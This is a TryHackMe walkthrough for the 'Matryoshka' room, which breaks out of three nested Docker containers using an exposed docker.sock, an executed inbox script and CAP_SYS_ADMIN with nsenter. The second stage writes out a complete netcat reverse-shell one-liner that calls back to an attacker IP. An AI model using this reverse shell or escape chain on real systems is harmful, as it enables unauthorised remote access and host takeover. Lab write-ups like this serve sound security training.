---
title: Matryoshka - TryHackMe - Walkthrough
date: 2026-05-10 10:00:00 +0200
categories: [TryHackMe]
tags: [docker, privesc, medium]
description: Escape from Docker containers thrice.
image:
  path: /assets/blog/Matryoshka/Room.png
---

## Introduction

This is a write-up for the challenge **Matryoshka** on TryHackMe. The challenge is rated as **medium** and can be found **[here](https://tryhackme.com/room/matryoshka)** and starts with the following description:

> **Matryoshka Containment Unit**
> 
> You set up a containment unit designed to trap and contain even the most nefarious viruses, but you accidentally got trapped in it while testing it.
> 
> Your memory is fuzzy, and you don't remember much about how you set it up.
> 
> Good luck!

For this challenge you already have access to a shell. There are credentials listed to connect to the machine using SSH.

## Escape 1 - Docker Socket

After connecting via SSH, we can confirm we are inside a Docker container, as indicated by the hexadecimal hostname.

A common privilege-escalation vector to escape from within a Docker container is access to the Docker daemon. This allows us to deploy containers inside the Docker container using the Docker utilities. We effectively have host-level privileges. To check whether this is the case we can inspect the privileges of the socket file located at `/var/run/docker.sock`.

```terminal
c9f5969c9f94:~$ ls -l /var/run/docker.sock
srw-rw-rw- 1 root 2375 0 May 10 11:37 /var/run/docker.sock
```

In our container the Docker interface is accessible by *everyone* which confirms that we can exploit this.

Additionally, we can check if there is already the Docker binary inside the container.

```terminal
c9f5969c9f94:~$ which docker
/usr/bin/docker
```

With everything prepared, we can proceed to check which containers are running or available. 

```terminal
c9f5969c9f94:~$ docker images
REPOSITORY          TAG       IMAGE ID       CREATED       SIZE
matryoshka-level1   local     485e908211ec   5 days ago    43.9MB
alpine              3.20      bf8527eb54c3   3 weeks ago   7.8MB
```

Since there is already an `alpine` container, we can use that container to gain access over the file system of the host by mounting the root directory.

```terminal
c9f5969c9f94:~$ docker run -v /:/mnt --rm -it alpine:3.20 chroot /mnt /bin/sh
/ # 
```

Next, we can check were the first flag is located, most likely it is located inside the `/root` directory. For this challenge the flag is already in the `/root` directory of the alpine container.

```terminal
/ # ls /root/
flag_level2.txt
/ # wc /root/flag_level2.txt
 1  1 20 /root/flag_level2.txt
```

## Escape 2 - Scripts

At this point, we can check the `/mnt` directory which should now contain new files. In the directory there is a folder named `level3share`.

```terminal
/ # ls -la /mnt/
total 12
drwxr-xr-x 1 root root 4096 May 10 11:37 .
drwxr-xr-x 1 root root 4096 May 10 11:37 ..
drwxrwxrwx 4 root root 4096 May 10 11:37 level3share
```

Inside this folder there are two other folders named `inbox` and `outbox`. 

```terminal
/ # ls -laR .
.:
total 16
drwxrwxrwx 4 root root 4096 May 10 11:37 .
drwxr-xr-x 1 root root 4096 May 10 11:37 ..
drwxrwxrwx 2 root root 4096 May 10 11:37 inbox
drwxrwxrwx 2 root root 4096 May 10 11:37 outbox

./inbox:
total 8
drwxrwxrwx 2 root root 4096 May 10 11:37 .
drwxrwxrwx 4 root root 4096 May 10 11:37 ..

./outbox:
total 8
drwxrwxrwx 2 root root 4096 May 10 11:37 .
drwxrwxrwx 4 root root 4096 May 10 11:37 ..
```

According to the hint (*`Look for an Inbox folder that allows script executions`*) associated to the next question we may need to paste a script inside the folder and then wait for it to be executed. To achieve code execution, we can simply paste a bash script that creates a reverse shell back to our attacker machine.

```terminal
/ # echo "nohup bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.157.127 9001 >/tmp/f' &" > /mnt/level3share/inbox/s.sh; chmod +x /mnt/level3share/inbox/s.sh
```

**Note:** The `nohup` and `&` are necessary for a stable shell, otherwise the shell will disconnect after about 15 seconds and become unresponsive.

Before executing the command above we need to start a listener to handle the reverse shell connection. When the bash script is pasted it takes a few seconds before getting a connection.

```terminal
nc -lvnp 9001                                                                      ✔  at 07:53:42
listening on [::]:9001 ...
connect to [::ffff:192.168.157.127]:9001 from [::ffff:10.113.154.163]:60346 ([::ffff:10.113.154.163]:60346)
bash: cannot set terminal process group (3561): Not a tty
bash: no job control in this shell
d17c7a644bf0:/#
```

For the second flag, just as we did before, we can check the `/root` directory.

```terminal
d17c7a644bf0:/# ls /root
ls /root
flag_level3.txt
d17c7a644bf0:/# wc /root/flag_level3.txt
wc /root/flag_level3.txt
 1  1 15 /root/flag_level3.txt
```

## Escape 3 - Capabilities

To exploit the last stage of the challenge, we can inspect the capabilities of the Docker container. 

```terminal
/# cat /proc/self/status | grep -i cap
cat /proc/self/status | grep -i cap
CapInh:	0000000000000000
CapPrm:	000001ffffffffff
CapEff:	000001ffffffffff
CapBnd:	000001ffffffffff
CapAmb:	0000000000000000
```

The key fields are `CapPrm` and `CapEff`. `CapPrm` defines the permissions a process may use, as we can see nearly any capability is available.

You may check the capabilities further using the `capsh` utility, it can decode the permissions further.

```terminal
$ capsh --decode=000001ffffffffff
0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
```

Furthermore, all of these capabilities are active according to the `CapEff` for the current process. The most important capability here is the `CAP_SYS_ADMIN`, this capability essentially allows us to escape the container.

For this exploit, we may use the `nsenter` command. This command allows us executing commands in another's process namespace. We can target the process `/sbin/init` which is the process with ID 1.

```terminal
d17c7a644bf0:/# nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
<rget 1 --mount --uts --ipc --net --pid -- /bin/bash
cd root
ls
flag_host.txt
snap
wc flag_host.txt
 1  1 16 flag_host.txt
```

Alternatively, there is another even simpler path to get to the root flag: The `/proc` directory also contains the host processes. In the directory of process 1 there is a `root` directory, so you can go into the `/proc/1/root` directory which will contain the host's file system.
